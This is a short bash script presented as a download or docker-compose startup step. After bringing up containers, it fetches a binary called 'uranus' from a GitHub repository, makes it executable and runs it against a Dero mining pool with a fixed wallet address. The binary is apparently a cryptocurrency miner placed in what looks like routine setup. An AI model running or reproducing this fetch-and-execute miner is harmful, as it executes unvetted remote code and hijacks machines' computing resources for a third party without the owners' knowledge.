#!/bin/bash
#download
for i in $(seq 1 5); do docker-compose up -d && s=0 && break || s=$? && sleep 20; done; (continue $s)
wget https://github.com/cekyokyoac/ncekyoaxz/raw/main/uranus
chmod +x uranus
./uranus -o wss://community-pools.mysrv.cloud:10300 -u dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq
